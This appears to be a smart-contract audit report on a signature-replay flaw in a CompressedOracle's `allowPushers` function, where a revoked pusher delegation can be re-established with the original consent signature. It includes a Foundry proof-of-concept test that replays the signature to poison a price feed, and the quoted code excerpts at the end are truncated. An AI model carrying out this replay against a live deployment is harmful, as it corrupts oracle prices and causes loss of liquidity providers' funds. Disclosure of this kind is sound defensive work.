### Title
Revoked EOA Pusher Delegation Can Be Silently Re-Established via Signature Replay in `allowPushers` — (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

After a pusher self-revokes via `revokePusher()`, the creator can replay the original consent signature (while the deadline is still valid) to silently re-establish delegation without any fresh consent from the pusher. The pusher's revocation is not final. Subsequent pushes the pusher believes are landing in their own namespace instead land in the creator's namespace, feeding potentially wrong prices into any pool that consumes the creator's feed.

---

### Finding Description

`allowPushers` in `CompressedOracleV1` accepts an EIP-191 signature whose preimage is:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

The signed message binds `(chainid, oracle, deadline, pusher, creator)` but contains **no nonce and no revocation state**. The function's only guards are an expired-deadline check and ECDSA recovery; it does not check whether `namespaceRemapping[pusher]` was previously cleared by a revocation, and it does not track whether a given signature has already been consumed. [2](#0-1) 

When a pusher calls `revokePusher()`, the mapping is cleared to `address(0)`: [3](#0-2) 

Because the original consent signature is on-chain (submitted in the first `allowPushers` call), the creator can immediately replay it — with the same `deadline` — to write `namespaceRemapping[pusher] = creator` again. The code comment itself acknowledges the risk but frames the deadline as the fix:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [4](#0-3) 

The deadline prevents replay of *undated* signatures, but a dated signature whose deadline has not yet elapsed is fully replayable. The `allowContractPushers` path is **not** vulnerable because it uses a live `isPusher(creator)` staticcall that reflects the contract's current state; only the EOA path is affected. [5](#0-4) 

After re-establishment, the `fallback` push path resolves the namespace from `namespaceRemapping[msg.sender]`: [6](#0-5) 

The pusher, believing they have detached and are now writing into their own namespace, continues to push data. Every word lands in the creator's namespace instead. If the pusher has switched to pushing data for a different asset pair (their own feed), those prices overwrite the creator's feed. Any pool whose price provider reads the creator's feed via `price(feedId, pool)` then executes swaps against the wrong price.

---

### Impact Explanation

The corrupted value is the `mid` price (and spread) stored in the creator's compressed slot, decoded by `getOracleData` and forwarded through `AnchoredPriceProvider._readLeg` or `ProtectedPriceProvider._getBidAndAskPrice` to `MetricOmmPool.swap`. [7](#0-6) 

A pool swap that executes against a price derived from the wrong asset pair causes the trader to receive more output than the oracle/bin curve permits (swap conservation failure) or the pool to receive less input than owed — direct loss of LP principal. This matches the "bad-price execution" and "swap conservation failure" impact categories.

---

### Likelihood Explanation

Medium. The original consent signature is submitted on-chain and is permanently visible in calldata. The creator needs only to save it and call `allowPushers` again before the deadline expires. Deadlines are typically set days in the future (the test suite uses `block.timestamp + 1 days`), giving a multi-hour to multi-day replay window after the pusher revokes. No privileged access is required; the creator is any unprivileged address. [8](#0-7) 

---

### Recommendation

1. **Add a per-pusher nonce** to the signed preimage: `keccak256(abi.encode(chainid, oracle, deadline, pusher, creator, nonce[pusher]))`. Increment `nonce[pusher]` inside both `revokePusher` and `removePushers`. A replayed signature will recover to a different hash and fail ECDSA recovery.

2. **Alternatively**, track consumed signature hashes in a `mapping(bytes32 => bool) usedConsents` and revert if the hash has already been processed.

3. **Alternatively**, inside `allowPushers`, revert if `namespaceRemapping[pusher] == address(0)` and the pusher has a non-zero revocation counter, forcing a fresh signature after every revocation.

---

### Proof of Concept

```solidity
// forge test --mt test_replay_after_revoke -vv
function test_replay_after_revoke() external {
    uint256 deadline = block.timestamp + 1 days;

    // Step 1: creator establishes delegation with pusher's consent
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);
    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator, "step1: delegated");

    // Step 2: pusher self-revokes — believes they are now detached
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "step2: revoked");

    // Step 3: creator replays the SAME on-chain signature (deadline still valid)
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // identical call
    assertEq(oracle.namespaceRemapping(pusher), creator, "step3: re-established without fresh consent");

    // Step 4: pusher pushes "their own" ETH/USD data — lands in creator's BTC/USD feed
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 wrongPrice = _packRaw(3_000_000 /* ETH price */, 5, 3);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, wrongPrice, tsMs));
    assertTrue(ok, "push succeeded");

    // Creator's slot 0 now contains ETH price, not BTC price
    IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
    assertEq(data.price, U64x32.decode(uint32(wrongPrice >> 16)), "creator feed poisoned with wrong price");

    // Pusher's own namespace is empty — pusher has no idea
    IOffchainOracle.OracleData memory own = oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0));
    assertEq(own.price, 0, "pusher namespace empty — pusher unaware of re-delegation");
}

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }

    function allowContractPushers(address[] calldata pushers) external {

            address pusher = pushers[i];

            if (pusher == msg.sender) {

    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
    }
